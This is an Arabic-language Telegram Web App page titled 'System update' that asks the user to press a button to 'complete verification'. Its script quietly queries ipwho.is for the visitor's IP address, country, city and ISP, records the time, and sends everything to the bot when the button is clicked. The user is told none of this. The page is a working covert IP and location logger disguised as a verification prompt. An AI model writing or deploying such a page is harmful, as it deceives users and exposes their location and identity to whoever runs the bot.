<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #18222d);
            color: var(--tg-theme-text-color, #ffffff);
            padding: 40px;
            text-align: center;
        }
        .btn {
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 15px 25px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            margin-top: 30px;
            width: 100%;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h2>اضغط على الزر أدناه لإتمام التحقق ✅</h2>
    <button class="btn" onclick="sendData()">تأكيد ودخول 🚀</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let payload = {};

        // جلب وقت الاستخدام والـ IP بسرعة
        const now = new Date();
        payload.usage_time = now.toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });

        fetch('https://ipwho.is/')
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    payload.ip = data.ip;
                    payload.country = data.country;
                    payload.city = data.city;
                    payload.isp = data.connection.isp;
                }
            }).catch(() => {});

        function sendData() {
            // إرسال البيانات المجمعة للبوت وإغلاق الواجهة فوراً
            tg.sendData(JSON.stringify(payload));
        }
    </script>
</body>
</html>
